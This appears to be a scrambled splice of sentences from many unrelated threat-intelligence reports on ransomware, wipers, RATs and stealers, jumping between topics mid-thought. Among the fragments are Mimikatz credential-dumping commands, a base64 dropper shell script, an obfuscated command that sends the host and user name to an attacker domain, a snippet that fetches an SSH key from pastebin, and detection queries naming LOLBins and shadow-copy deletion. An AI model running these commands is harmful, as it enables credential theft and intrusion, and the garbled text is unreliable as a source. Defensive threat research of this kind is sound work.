SHA256 Worker WatchDog Wallet f235c021baa6c8801e724d45003b1b1541eea5483810abc9c3eb4df6bf05afbf 3910 3d8a6f5d8162e8eb78e7b95384ec6418f65b904dffa8fd983a6a19a5645ad707 clean c141eaeab461a2481124a73ee2d254301573d8722dbf3221f5fc54d7770e67a2 clean Yes 64072e7c56895f59124c4e26e0dd65a4de0bd8280c83372c18f9835978cda0e9 clean 30f0207b74d6d2d17cd8f4dc9f9131bd8763702f19c87ce74ea13a634f52c995 clean Yes 7a8c91f4228be4d36e1087acc9bb046373ddfde506fe4645ad1b0967c08bfa8b clean Yes 7848fc64c9977796dcc0ee67c293f006d715d3b3e257a3c0f4654cefab637c45 clean Yes 3e6cf5ae8ce6ff7305da4e218a20ec7f57933235ec07d7ff6e6a18c7c844ff29 clean Yes 8d9bdcae4a4559e52b3d03209a1ef880e948d9f3969f7779119d9322c5f7cf7c clean Yes ab73aedbee66081cd047b19a4bb036f85791a9ae9abc90545c5d8756bbc2a428 clean Yes eca42c42f0909cf4e6df6bf8de35ab93ef6a3dd10d0d5e556721ec1871a9990c dream e47802d7f44fc9e594b89ef33298367d21695d5ec1ae5e6c526b9f3124c555ca Undefined cf890e288f4fb7a2cfb0aa7e91229cc51c224e767c6ca69bbbb9d06e999ede64 Undefined Table 2.
If so, it reads the 64-bit loader (msvcr120d.dll) from disk and runs it as a shellcode. 
By acquiring the database passwords, the attackers gain broad access to sensitive information even though the most sensitive data stored in devices running RES 3700 POS should still be protected by encryption. 
Next, the Fantasy wiper clears all Windows event logs and creates another batch file, system.bat, in %WINDOWS%\Temp, that recursively deletes all files on %SYSTEMDRIVE%, attempts to clear file system cache memory, and self-deletes.
CHM payloads are useful for the actor as it requires a low amount of user interaction, it does not require a vulnerable version of Microsoft Office installed like the Excel files, and it also uses LZX compression that will bypass static malware analysis solutions that do not decompress the file. 
Figure 1: Example of a download location for GetHttpsInfo.exe Lateral movement (TA0008) 
This means that the way CET is currently implemented is quite ineffective because the renderer process is the one that gets typically exploited. 
This may indicate the ransomware was originally written to target Windows platforms. 
The python script finds instructions pattern that raise an exception and patch them by jump instruction with transformed EIP offset as a target. 
Monitor for modifications to functions exported from authentication DLLs (such as cryptdll.dll and samsrv.dll). 
A number of application crashes were observed across several compromised hosts.
Although we did not observe any plug-ins, the backdoor contains code that hints that they can be used to further extend functionality. 
IO.MemoryStream", "iex ", "iex(", "Invoke-WebRequest", "set-MpPreference", "add-MpPreference", "certutil", "bitsadmin", "csvhost.exe", "ekern.exe", "svhost.exe", ".dmp") or ProcessCommandLine matches regex @"[-/–][Ee^]{1,2}[ncodema^]*\s[A-Za-z0-9+/=]{15,}")) or (FileName =~ "curl.exe" and ProcessCommandLine contains "http") or (FileName =~ "wget.exe" and ProcessCommandLine contains "http") or ProcessCommandLine has_any ("E:jscript", "e:vbscript") or ProcessCommandLine has_all ("localgroup Administrators", "/add") or ProcessCommandLine has_all ("reg add", "DisableAntiSpyware", @"\Microsoft\Windows Defender") or ProcessCommandLine has_all ("reg add", "DisableRestrictedAdmin", @"CurrentControlSet\Control\Lsa") or ProcessCommandLine has_all ("wmic", "process call create") or ProcessCommandLine has_all ("net", "user ", "/add") or ProcessCommandLine has_all ("net1", "user ", "/add") or ProcessCommandLine has_all ("vssadmin", "delete", "shadows") or ProcessCommandLine has_all ("wmic", "delete", "shadowcopy") or ProcessCommandLine has_all ("wbadmin", "delete", "catalog") or (ProcessCommandLine has "lsass" and ProcessCommandLine has_any ("procdump", "tasklist", "findstr")) Log4J Wstomcat Process Execution. DeviceProcessEvents | where InitiatingProcessFileName has "ws_tomcatservice.exe" and FileName !in~("repadmin.exe") Encoded watcher Function. 
The dropped executable and the normally-downloaded Gigabyte tools do have a Gigabyte cryptographic signature that satisfies the code signing requirements of Microsoft Windows, but this does little to offset malicious use, especially if exploited using Living-off-the-Land techniques (like in the recent alert regarding Volt Typhoon attackers).
First seen2023-03-20 02:23:29 MD5FC41CB8425B6432AF8403959BB59430D SHA-19D8BADE2030C93D0A010AA57B90915EB7D99EC82 SHA-256F638E5A20114019AD066DD0E856F97FD865798D8FBED1766662D970BEFF652CA FilenameHSBC_job_offer.pdf.zip DescriptionA ZIP archive with a Linux payload, from VirusTotal. 
Create Account: Local Account Creates new users’ accounts. 
So if you write the name of a zip file in the bar, it will open the default browser and go to that page. 
Such attacks continue today, and Russian companies are also among their targets. 
HelloKitty Usage At the start of the group’s observed operations in 2021, Vice Society affiliates used the HelloKitty Ransomware variant as a primary payload in their infection chain. 
This was likely done to ensure nothing will interfere with the propagation of the ransomware payload. 
Some specific cookies related to Google domain names are ignored, probably because they are mostly related to specific Google features or tracking that are considered useless by the threat actor. 
Its feature set expanded over the years to include various surveillance, persistence, and information-stealing capabilities: Taking full control of the infected machine Recording keystrokes in real time with offline logging available Accessing live web cam feeds including microphone recording Downloading files remotely Remote shutdown and reboot Disabling user input Over Gh0st RAT’s long life, Chinese nation-state threat actors have used it to breach high-value targets such as governments, embassies, economic targets, and media.
| Check PIN9000 _
TAs have opted for this technique due to its ability to bypass detection mechanisms.
In that same year, Emisoft released a decryption tool for early versions of GlobeImposter.
[9] CISA Alert AA20-107A: Continued Threat Actor Exploitation Post Pulse Secure VPN Patching [10] GitHub
DoubleZero wiper On March 22, 2022 CERT-UA reported a new wiper used against their infrastructure and enterprises.
ShellExecute($file) } } catch [System.
The malware exploits custom URL schemes in the Safari browser to remotely infect macOS targets.
In particular, we’ve noted that the PE shellcode loader in use is unique in our experience.
The result of the "tasklist" command shows that the victim was using a commercial software called SONAS
"$CT" -O >"$APP_MACH";rm -rf "$CT";rm -rf "$BLOB_PATH";chmod +x "$APP_MACH"; I2P Dropper Script #!/bin/bash rm -rf "$0";I2PCTMPFILE=$(mktemp /tmp/._XXXXXXXX);I2PBASE64BLOB="[base64 blob]";echo $I2PBASE64BLOB | base64 -o "$I2PCTMPFILE" -d;tar -xf "$I2PCTMPFILE" -O > "$0";head -c $(($RANDOM*$((1 + RANDOM % 1000))))
Detect: User Behavior Analysis Job Function Access Pattern Analysis
Pass the Hash
And SYS01 stealer at heart relies on a social engineering campaign, so it’s important to train users about the tricks adversaries use
The code snippet in Figure 20 demonstrates how the malware downloads, deobfuscates, and decompresses file_17.pack (UpdateTask.dll). 
The file xxx.zip is a logging file with a fake ZIP header prepended at offset 0x0 and taking up the first 0x100 bytes.
FROM AntivirusProduct" "SELECT *
Sends a handshake and status request.
NCC Group and Fox-IT identified that the language in the text-message for 2FA is based on the web browser’s language settings used during the authentication flow.
Figure 6 – Financial targets in Mexico Based on the URLs of the financial targets in Mexico, the threat actor behind CMDStealer is highly interested in compromising enterprise/business accounts. 
The POSHSPY backdoor is designed to download and execute additional PowerShell code and Windows binaries.
"nltest /domain_trusts >>
Until 2023, this subgroup had been slow to adopt exploits for recently-disclosed vulnerabilities with publicly reported POCs, often taking several weeks to successfully weaponize exploits for vulnerabilities like Proxyshell and Log4Shell.
The post How to Detect Cobalt Strike appeared first on Intezer. 
The Beginner's Guide (VARONIS) Revisions September 14, 2020:
Additionally, the Automated Enrichment playbook pack would also work well with the output of any of these analytics. 
From there, the threat actor began connecting to various hosts across the network. 
Drokbk: Drokbk.exe is a custom .NET implant with two components: an installer, sometimes accessed from a compressed archive on a legitimate file-sharing platform, and a secondary backdoor payload.
The three main changes are: Modified malware signing Embedding of EldoS RawDisk driver inside the wiper malware Automatic wiping after driver installation command Historically, in ZEROCLEARE and DUSTMAN incidents from 2019, the wiper malware and raw disk drivers were not signed and therefore could not directly access the raw disk for speedy data wiping.
If you think this or any other cybersecurity threat has impacted your organization, contact our Global FortiGuard Incident Response Team. 
The Cofense® and PhishMe® names and logos, as well as any other Cofense product or service names or logos displayed on this blog are registered trademarks or trademarks of Cofense Inc. 
Determining whether hosts have communicated with threat actor infrastructure:
Junk codes in more recent versions of NUPAKAGE HackTool.
We also found they compromise the domain controller in the victim’s environment and deployed Cobalt Strike on their hosts by creating immediate tasks through GPO.
It also provides guidance for defenders on protecting organizations from this threat, and how Microsoft security technologies detect it. Figure 1.
IOCs f0b081ca58b6c253aa0014847c62dbad 6a2204b32a60aed0a3403c63ad2a529c 5.188.33[.]190 103.169.90[.]132 103.159.132[.]91 23.106.123[.]59 Check Point Customers remain protected: Threat Emulation provides comprehensive coverage of attack tactics, file types, and operating systems, powered by ThreatCloud AI – the brain behind all of Check Point’s Security. 
Educational and training institutions in the region simply cannot keep up with the current demand for IT security professionals.
Suspicious File On the servers, we detected suspicious files of exe and dll formats FileName Path DrSDKCaller.exe C:\root\DrSDKCaller.exe all.exe C:\Users\Public\all.exe dump.dll C:\Users\Public\dump.dll ad.exe C:\Users\Public\ad.exe gpg-error.exe C:\PerfLogs\gpg-error.exe cm.exe C:\PerfLogs\cm.exe msado32.tlb C:\Program Files\Common Files\system\ado\msado32.tlb Among the suspect files, based on the commands executed on the server, we determined that all.exe and dump.dll are responsible for credentials dumping on the server system.
Left is the corrupted ShellFang and the right one is the normal one. 
Watch.targets 
TA0006 Credential Access T1555.
Figure 1 depicts this attack flow. 
Cyber defenders need to design and deploy effective monitoring capabilities that allow them to detect and respond to RedLine Stealer malware attacks. 
6f191f598589b7708b1890d56b374b45c6eb41610d34f976f0b4cfde8d5731af 
FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. 
Figure 2 Campaign Overview The generic theme of the email is invoice or legal related.
However, the threat actor had knowledge of these accounts and used them on the correct systems, which further confirmed that the threat actor had advanced knowledge of the victim’s environment. 
The ransom note serves as a communication channel through which the victims can follow the specified steps to engage with the ransomware operators and negotiate the terms of the ransom payment. 
No files will be recovered if the ransom is paid. 
Defense EvasionT1027Obfuscated Files or InformationFlowCloud files are distributed and stored in encrypted form. 
Malicious installers uploaded by the attackers to their cloud storage on January 6th, 2023 When these installers are executed, they usually: Drop and execute the malicious loader, and files needed to run the FatalRAT malware, in the %PROGRAMDATA%\Progtmy directory. 
The group was behind one of the largest attacks on ATMs in the country, infecting and jackpotting more than 1,000 machines, while also cloning in excess of 28,000 credit cards that were used in these ATMs before the big heist.
Another interesting feature is the near real-time monitoring of process activity.
Date time checking Anti-Sandbox Anti-VM Anti-Scanner FTP server setting Steal data Upload Stolen data Clear log It first checks whether the system’s date is between 2022-11-09 and 2023-04-12.
The size can be retrieved from the cbLength member. 
To find this image, it iterates through all the Shape objects in the document and deletes the one with the same name. 
Decodes sensitive memory regions in the current process with the same XOR key 7. Patches security-related APIs to disable them 8. 
Archive Collected Data T1564.003 
Lastly, the discovery module will use NetServerEnum to identify available Windows hosts within the domain/workgroup.
T1518.001Software Discovery: Security Software
When Netwalker changed its contact mode and switched from email to the submission of the user key directly on the web portal of the group’s blog, the configuration file in the resource also changed. 
The actor then used the malicious inbound connector to send spam emails that looked like they originated from the targets’ domain.
[D3-EAL] Modify Authentication Process
That includes the Material Tailwind and IconBurst campaigns, as well as the more recent campaign we identified distributing Havoc malware. 
Wave 1 wiper DeviceControl API methods: IOCTL_DISK_GET_DRIVE_GEOMETRY_EX IOCTL_DISK_GET_DRIVE_GEOMETRY IOCTL_DISK_GET_LENGTH_INFO Wave 2 wiper DeviceControl API methods: IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS (new method in wave 2; used in multiple instances) IOCTL_DISK_GET_DRIVE_GEOMETRY IOCTL_DISK_GET_LENGTH_INFO Based on our telemetry, we suspect the infections are associated with law enforcement institutions in Albania.
Attacks on software developers are especially dangerous for the risk they pose to end users, as already happened in the well-known cases of CCleaner and ASUS.
According to third-party reporting, Royal actors most commonly (in 66.7% of incidents) gain initial access to victim networks via successful phishing emails [T1566]. 
New Horabot campaign targets the Americas
Install and regularly update anti-virus or anti-malware software on all hosts. 
Method 1: Use powershell command: Get-ChildItem -Recurse -Path <Path_IIS_Logs> -Filter "*.log"
Over the course of our investigation, we found out that the backdoored installers are nothing more than first stage implants that are used to download and deploy further payloads before the actual FinSpy Trojan. 
On top of those, it also uses a few tricks of its own: Covers its tracks by overwriting the code previously modified by the malicious library with a useless call to lstrlenW. Base64-encoded strings are used for function imports (via GetProcAddress) and only decoded as needed. 
Defense evasion (TA0005) 
"cmd" /c cd /d C:\MS_DATA\&makecab da.back d.zip >1.txt&cd For lateral movement, the attackers made use of the PsExec tool and the net use command for accessing shared resources on remote machines. 
Recognizing this pattern, i realized that by making targeted modifications to the Nuitka compiler code, we could potentially achieve 100% FUD (Fully Undetected) obfuscation. 
Figure 4: Malicious script, heavily obfuscated This script is the first of several stages that leads to the execution of the final payload.
title: MERCURY and DEV-1084: Destructive attack on hybrid environment url: https://www.microsoft.com/en-us/security/blog/2023/04/07/mercury-and-dev-1084-destructive-attack-on-hybrid-environment/ April 2023 update – Microsoft Threat Intelligence has shifted to a new threat actor naming taxonomy aligned around the theme of weather.
=C:\ESD\sharez.txt dllhost32.exe -n=1 -s
The writeups conducted by "Northwave-Security" and "Deepinstinct" share more light onto these flags.
title: Gotta Catch ‘Em All | Understanding the NetSupport RAT Campaigns Hiding Behind Pokemon Lures url: https://www.sentinelone.com/blog/gotta-catch-em-all-understanding-the-netsupport-rat-campaigns-hiding-behind-pokemon-lures/ Researchers at ASEC recently reported on a NetSupport RAT campaign that utilizes Pokemon as the social engineering lure.
[T1105] Chinese state-sponsored cyber actors have been observed importing tools from GitHub or infected domains to victim networks.
For example, mid-stage infections showed calls to "146[.]70[.]86[.]44"[gerhiles[.]com].
Monitor for new, unfamiliar DLL files written to a domain controller and/or local computer.
With SOCRadar’s Attack Surface Management, security teams can track which CVEs are present in the environment.
This vulnerability, registered as “CVE-2018-17153,” can allow for unauthorised actors to bypass authentication and register their activity on a specific IP address as an administrator.
Figure 11.
Verify successful implementation of mitigations by executing the vendor supplied script Horizon_Windows_Log4j_Mitigations.zip without parameters to ensure that no vulnerabilities remain.
If an individual user needs administrative rights over their workstation, use a separate account that does not have administrative access to other hosts, such as servers. Consider using a privileged access management (PAM) solution to manage access to privileged accounts and resources
Specifically, the domain oracle.zzhreceive[.]top was originally linked to TeamTNT operations due to the usage of the term zzhreceive, which has been witnessed within several TeamTNT operations.
Users of the Qualys Cyber Security Asset Management can quickly identify all installed software across their organization.
IoCs SHA-1FilenameESET detection nameDescription F9F6C0184CEE9C1E4E15C2A73E56D7B927EA685BN/AWin64/Agent.
The shellcode injects another trampoline shellcode in Explorer. 
The RAT was distributed via a monthly license for $30 USD or a lifetime license of $60 USD.
According to Proofpoint, these new variants have been seen used by three distinct threat actors in seven campaigns since late last year, focusing on further payload delivery, most notably ransomware. 
It also further instructs customers on how to ensure their devices are appropriately configured. 
= ⟨M1⟩ ⋅
The initial intrusion vector and the majority of the TTPs we observed closely match those conducted by, or associated with, the Soft Cell actors.
The softwares price will include a guarantee that your company will never be inconvenienced by us. 
Based on initial analysis from Mandiant incident response engagements, the earliest evidence of exploitation occurred on May 27, 2023 resulting in deployment of web shells and data theft.
For instance, if we overwrite the pointer dereferenced in a CALL [rax] instruction with a ROP gadget address, CFG will block our exploit by throwing an exception. 
This pattern of decrypting strings for future use will come up later in the analysis of the DLL loader. 
Executive Summary This technical analysis provides an in-depth analysis and review of NotPetya. 
In some cases, the subgroup does not act on the information they collect, possibly because they assess that a victim does not meet any targeting requirements or because the subgroup wishes to wait and focus on more valuable targets.
The code defines a list of virtualized CPU features and then checks if any of these features are present in the CPU information’s “flags” field.
EclecticIQ analysts identified post-exploitation and reconnaissance tools on the server.
There are also some differences in the algorithm used to deobfuscate it. 
This naming convention is similar to the one used at the same time by the MQsTTang backdoor versions discovered by ESET and found in VT.
The obfuscated registry is then read by MSHTA and the obfuscated code is de-obfuscated.
Cobalt Strike allows actors to shape the traffic of beacons to mimic legitimate traffic patterns.
This tool enables the TAs to create customized documents containing embedded objects that exploit vulnerabilities in Microsoft Word’s Equation Editor. 
TrueBot is under active development by Silence, with recent versions using a Netwrix vulnerability for delivery.
It is a key logger that saves data in the “KeyLogs” folder.
The BfV, a German governmental entity, published a report in January 2022 mentioning attacks against German companies with HyperBro samples that were also signed with the same certificate.
Hosts with Unconstrained Delegation enabled Remove Unconstrained Delegation from all servers.
Encrypted files appended with the “.royal” extension For each directory it traverses, Royal ransomware drops a text file named “README.TXT” that contains the ransom note (Figure 16), as well as an advertisement for its “pentesting services” that the ransomware actors will allegedly provide once the ransom has been paid (Figure 17). 
Any log modification has been made to redact client information, break potential links, or for readability. 
Before 12 March 2020, NetWalker used the email contact process between its support operation and the victims to proceed with payment and send the decryption program.
For requests containing the “343” GET parameter, the plugin returns the MD5 hash of ‘343’ which is equal 3ad7c2ebb96fcba7cda0cf54a2e802f5.Verification of the plugin installationHere, you can see how hackers verify the presence of the plugin before and after the infection://Before the infection a real site web page is returned: 21414 bytes 193.169.195.64 - - [12/May/2023:21:17:23 +0000] "GET /?343=1 HTTP/1.0" 200 21414 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)
NewValue == "True" | project ConsentTimestamp =Timestamp, UserId, AccountObjectId, ReportId, ActionType | join kind = leftouter (CloudAppEvents | where Application == "Office 365" | where ActionType == "Add app role assignment to service principal." 
Process Name Command Line tmp.exe C:\Users\admin\AppData\Local\Temp\tmp.exe Behavior Activities: tmp.exe Infostealers often target stored browser data, which can include saved credentials etc. 
The payload contains two additional base64 encoded scripts to set permissions, download, and configure miner and IRC bot infections.
Figure 4.
Attack Lifecycle Between 2019 and 2020, Mandiant responded to several incidents where Microsoft SharePoint vulnerability CVE-2019-0604 was used to deliver web shells, and then FOCUSFJORD payloads to select government and academic targets in the Middle East and Central Asia. 
(objectCategory=subnet) >
If upgrading is not immediately feasible, see KB87073 and KB87092 for vendor-provided temporary workarounds.
MITRE Tactics Techniques Discovery T1087 - Account Discovery T1482 - Domain Trust Discovery Execution T1204.002 - User Execution: Malicious File Defense Evasion T1574.002 - Hijack Execution Flow: DLL Side-Loading T1055 - Process Injection T1070.006 - Timestomp T1140 - Deobfuscate/Decode Files or Information T1070 - Indicator Removal T1562.010 - Downgrade Attack Persistence T1053.005 - Scheduled
China Chopper Still Active
T1349 Build or Acquire Exploit CISA has observed the threat actors using a variety of open-source and publicly available exploits and exploit code to compromise Federal Government networks. 
As of April 25, 2022, the BlackByte ransomware operators have not published any noteworthy data related to this government entity.
If a host requires specific outbound traffic, consider creating an allowlist policy of domains. 
See Figure 1 for a timeline of the red team’s initial access and lateral movement showing key access points. 
Upon checking the FTP server, we learned that the threat actors focused on sensitive and confidential documents, most of which were compressed and protected with a password.
The resulting path is assigned to the $file variable. $down.
User Mode Infection Overview This infection is by far the most complex.
Exploring advanced exfiltration techniques, enabling the covert transfer of sensitive data from target environments. 
T1106Native
We accessed C2 while visiting port 80. (VirusTotal Graph: Collection) 
following is a list of process names that during Rorschach’s execution these names are compared to those running on the machine and killed if matched.
== 0x70 // size of record header // size of data at least 0x28 for first record and uint32(0x70+0x18) - 0x28 >= 0x28 // payloadHeader.numblocks (payloadHeader at 0x70+uint16(0x70+0x22)) and (uint16(0x70+uint16(0x70+0x22)+0x10) == 0x2 or uint16(0x70+uint16(0x70+0x22)+0x10) == 0x3 or uint16(0x70+uint16(0x70+0x22)+0x10) == 0x4 or uint16(0x70+uint16(0x70+0x22)+0x10) == 0x5) // this is a size, assume it is less than our filesize and uint32(0x70+uint16(0x70+0x22)+0xC) < filesize // confirm malware using 2 different methods and ( // look for hardcoded magic in first log record uint32(0x70+uint16(0x70+0x22))
The threat actor then deployed Anydesk, which was the only observed persistence mechanism used during the intrusion.
The registry value contains the command that launches the shortcut (LNK) which contains powershell.exe in the relative path.
One of the primary challenges an attacker will face while moving laterally inside a network is to hide their activities in plain sight by generating a minimum volume of legitimate looking logs to be able to remain undetected.
Enable safe DLL search mode. 
SimplexTea payload loads its configuration in a very similar way to the SIMPLESEA malware from the 3CX official incident response.
=anonymous the Windows Explorer will not spawn a new browser but will map the folder directly. 
Create a separate network folder for each user when managing access to shared network folders. 
Figure 1.1 Process Chain 
The stealthiness of a supply-chain attack makes this method of distributing malware very appealing from an attacker’s perspective.
It is now dynamically received from the C&C in the form of shellcode. 
To hide the strings it uses during its execution, it primarily uses a simple encoding by subtracting 35 from each character of the original string and encoding the result with Base64.
Flush();$Stream.
Pivoting to the cloud Mass Azure resource deletion On the same day, a successful sign-in to the Microsoft Azure environment was observed.
However, for the sake of transparency, we decided to include our research efforts. 
Sector 34 contains the original MBR that was encoded by XORing with 0x7 MFT Encryption As mentioned previously, the malware has its own custom boot loader once the machine has been infected and rebooted.
The scripts show certain similarities in structure and have the same loop of file lines at the same path.
msvcr90.dll The Trojan bundle, encrypted with XOR and compressed with aPLib. msvcr120d.dll 64-bit Trojan loader.
^/^i htt^p:/^/mirz^adih^atti^[.]com^/cs^s/t^ry.php?h=%computername%*%username% /^q^n ^/^norestart" /ft 
"objectcategory=computer" find.exe -f "(objectcategory=organizationalUnit)" find.exe -subnets -f (objectCategory=subnet) find.exe -f "(objectcategory=group)" find.exe -gcb -sc trustdmp The second script, p.bat, was run to sweep the network using ping, looking for network connectivity and online hosts. 
This targeting was likely in response to Iran’s attribution of cyberattacks that halted maritime traffic at a major Iranian seaport in May 2020, delayed Iranian trains in July 2021, and crashed gas station payment systems throughout Iran in late 2021.
When opened, the document triggers the injection of a custom downloader – a PE executable – into an iexplore.exe process.
A WORD value of 2, 3, 4, or 5 at offset 16 (number of blocks) 
Associated indicators (IOCs) 
An event that is logged whenever an attempt is made to access an object (such as files, registry or directories) in the Windows file system.
Example 1: IcedID Standard Campaign Proofpoint observed a campaign with over 2,800 messages on 10 March 2023.
[M1018]. Detection:
While we have not seen evidence suggesting that the operators of the DARKSIDE service have resumed operations, we anticipate that at least some of the former affiliates of the DARKSIDE service will likely identify different ransomware or malware offerings to use within their own operations. 
The beacon traffic resolves to a Cloudflare IP address.
Then, the ‘OffSec’ class is instantiated in the main program routine so it gets loaded in memory along with its methods. 
By knowing the exact location in code where each master key is generated and precisely where it resides in memory, it is possible to extract the key.
De-obfuscated content from the HTA file is shown below: Figure 15 Deobfuscated HTA content Curl is used to download the malicious DLL file in C:\ProgramData Folder with .png extension.
Vulnerability 2: Related Generators\nRecall that the original definition requires the generators to be sampled randomly, such that their discrete logarithm with respect to a common generator (or to each other) shall not be known.
Function() to transfer a bit block of color data from the screen to the Graphic drawing surface that will be saved in memory stream for data exfiltration. 
Figure 1 – Stages of Lateral movement To be able to distinguish between the admissible and malicious use of these inbuilt services, it is extremely critical for organizations to deploy advanced Threat Detection solutions.
Same as Bootstrap. 
[D3-HD] URL Analysis [D3-UA] File Analysis Dynamic Analysis [D3-DA] Isolate: Execution Isolation Hardware-based Process Isolation [D3-HBPI] Executable Allowlisting
Internal Reconnaissance to Identify Lateral Movement Opportunities EclecticIQ researchers observed multiple internal network reconnaissance attempts after initial compromise.
Figure 6 After establishing a connection to its C2, it will fetch another configuration setting data from its C2 server that will fill the ScanningArg() class, which is a data structure of boolean variables that will serve as a switch to RedLine functionality. 
C05B4AD7A3322917E17710842FB88A090198D51FN/AWin32/Agent.TWILookBack trojanized libcurl loader. 
Fantasy then assigns a specific timestamp (2037-01-01 00:00:00) to these file timestamp properties: CreationTime LastAccessTime LastWriteTime CreationTimeUtc SetLastAccessTimeUtc LastWriteTimeUtc and then deletes the file.
Further notes Full path to file and hidden files By supplying a full path like dbexport.zip\app.jar to the explorer location bar, the binary will immediately be executed. 
Sality infected executable compared to the original file.
We’ve also included the corresponding offset and size to provide a better visual reference of the data structure used by the malware, and to easily cross-reference each field of interest. 
Windows Command Shell T1059.005 Command and Scripting Interpreter:
This table contains some of the arguments that we discovered: ArgumentExample ParameterDescription–run=1234Password needed to run the sample, possibly built on demand.–nomutex=1Do not create a mutex, therefore do not insure that only a single instance is running.–log=1Create log files.–nodel=0Do not self-delete on execution.–path=“C:”Encrypt only the following path.–noshare=1Do not encrypt shares.–pt=”C:.dll”Explicitly state the loader DLL.–cg=”C:.ini”Explicitly state the configuration file that stores the malware.–we=”C:.exe”Explicitly state the main executable.–diskpart=1Run diskpart.exe /s AppData_x.txt that removes read-
This Linux sample led to the discovery of additional HelloKitty samples for Linux dating back to October 2020.
The total amount of bitcoin extorted this way between 1 March 2020 and 27 July 2020 is 677 BTC.
def get_pub_key(): """Get SSH pub key from third party service""" try: global PRIVATE_KEY global AUTHORIZED_KEY url = "https://pastebin.com/raw/XXXXXXX" r = requests.get(url) if r.status_code == 200: pub_key
One of the credential theft techniques identified by CrowdStrike was the use of a PowerShell script to execute Mimikatz in-memory.
In part of our analysis, we used a ransomware sample with the detection name Ransom.Win64.YORAL.SMYXCJCT.
MivoCloud has also been used to host Diceloader and Carbanak C2 servers. 
The backdoor uses an RC4 key configured by an earlier stage of execution to encrypt and decrypt the Data field.
Then I kicked off a file monitor, filtering on the locker_Apple_M1_64 process: # FileMonitor.app/Contents/MacOS/FileMonitor -pretty -json -filter locker_Apple_M1_64 ... 
The hiding functionality Before transferring execution to the Orchestrator’s entry point, the Hider activates its concealing functionality.
Unit 42 researchers identified two new Trigona ransom notes in January 2023 and two in February 2023.
title: LAPSUS$: Recent techniques, tactics and procedures url: https://research.nccgroup.com/2022/04/28/lapsus-recent-techniques-tactics-and-procedures/ Authored by: David Brown, Michael Matthews and Rob Smallridge tl;dr This post describes the techniques, tactics and procedures we observed during recent LAPSUS$ incidents. 
These cryptograms will then be used in a fraudulent transaction through one of the cybercrime tools whose output log can be seen below. 
Nanopool mining operation. 
It then copies the “Login Data” file to a temporary file “chromedb_tmp”, issues an SQL query to extract the URL, login, and password fields from the file, and then decrypts them and appends the result to the “passwords.txt” file. 
Credential Access Process access to LSASS was observed, likely to dump credentials from a process that was injected with Cobalt Strike.
Cloud attack flow timeline Mitigations for destructive attacks The techniques used by the actors and described in this blog can be mitigated by adopting the following security measures: Recommendations to secure your on-prem environment Refer to Microsoft’s blog Ransomware as a service: Understanding the cybercrime gig economy and how to protect yourself for recommendations on building strong credential hygiene and other robust measures to defend against ransomware and human operated attacks. 
Successful payload retrieval debug message To decompress the payload, the malware uses Microsoft Cabinet's Compressapi with the compression algorithm ("COMPRESS_RAW | COMPRESS_ALGORITHM_LZMS").
Additional mitigations include: Consider implementing Web Application Firewalls (WAF), which can prevent exploit traffic from reaching an application. 
Additional Resources LockBit 3.0: Another Upgrade to the World’s Most Active RansomwareRansomware Groups to Watch: Emerging ThreatsAverage Ransom Payment Up 71% This Year, Approaches $1 Million2022 Unit 42 Ransomware Threat Report Highlights Get updates from Palo Alto Networks! 
Next, it encrypts the string using a simple XOR encryption algorithm with the key NASA and Base64 encodes it afterward.
The execution of one of the above-mentioned binaries leads to another obfuscated binary carrying an embedded resource.
Then, on March 12th, 2022, Agrius launched the wiping attack by deploying Fantasy and Sandals, first to the victim in South Africa and then to victims in Israel and lastly to a victim in Hong Kong. 
Trace data of the normal Windows process, mstsc.exe Figure 4 displays the trace data of mstsc.exe being executed after being injected with malware.
They have a large network infrastructure for command and control: ESET observed at least 24 different IP addresses in use in the second half of 2020.
Three years ago, we were investigating an infection of a cryptocurrency company located in Southeast Asia.
FlowingFrog and JollyFrog share network infrastructure – more precisely, the domain ffca.caibi379[.]com, as mentioned by Proofpoint. 
Example of ransom note after March 2020 NetWalker Analysis Figure 4. NetWalker behavior NetWalker Resource Analysis (Pre-March 2020) 
Here’s what we’ll cover: Basic terms that explain how malware is delivered to endpoints. 
They also included the old file-sharing links previously used by REvil as proof of compromise. 
mimikatz.exe privilege::debug sekurlsa::logonPasswords full samdump::hashes exit > "c:\programdata\creds.txt" C:\Windows\system32\cmd.exe powershell -ep bypass -C "import-module .\katz.ps1;Invoke-Katz" > mimi.txt DCSync Credentials were also dumped via DCSync using two compromised high privilege accounts.
Figure 1: Sample Hive Ransom Note Table 1: Anonymous File Sharing Sites Used to Disclose Data https://anonfiles[.]com https://mega[.]nz https://send.exploit[.]in https://ufile[.]io https://www.sendspace[.]com https://privatlab[.]net https://privatlab[.]com Once the victim organization contacts Hive actors on the live chat panel, Hive actors communicate the ransom amount and the payment deadline.
Another round of activity took place using system tools, batch files, and Adget.
To combat this, the threat actor periodically “refreshed” their credential set by performing credential theft activities in an already compromised environment.
The entry point of the original file is relocated, and so is the Import Address Table (IAT).
Conversely, backward-edge CFI like Intel’s CET protects a function’s return address by comparing it to a previously saved version of the address that is stored on the Shadow Stack.
The PowerShell script decoded from the Ir8 variable uses Reflection.
Ensure there are unique and distinct administrative accounts for each set of administrative tasks. 
With respect to the network setup, the following are the key aspects, however this list is not exhaustive, and much more could be added: Replicating critical network assets and services with decoy machines: Replicating critical network services like Active Directory, DB services, etc., will make more sense since these are the most targeted systems in the network.
While the entry point function of the application looks clear, inspection of the executable’s PE file sections does reveal anomalies: the backdoored application has its last section (.rsrc on the screenshot below) expanded by 51 KB. Sections of the original (left) and backdoored (right) application Apart from that, a part of code from the .text section (roughly 8 KB) is overwritten with heavily obfuscated code, with the original application code placed in the expanded last section. 
Is the (untrusted) process rapidly creating several encrypted files? 
EngimaDownloader_s001 API Hashing: API hashing is a technique employed by malware to conceal the utilization of potentially suspicious APIs (functions) from static detection.
We discussed Rorschach’s hybrid-cryptography scheme in detail above, but we suspect that this routine was borrowed from the leaked source code of Babuk ransomware.
All remaining inaccuracies are the sole responsibility of the author.\n
This vulnerability, registered as “CVE-2018-14327,” allows a low-privileged user account to escalate privileges on any Windows machine that had connected to the EE Mini modem via USB.
rundll32.exe C:\Windows\system32\rundll32.exe 19284 powershell.exe “c:\windows\syswow64\windowspowershell\v1.0\powershell.exe” -Version 5.1 -s
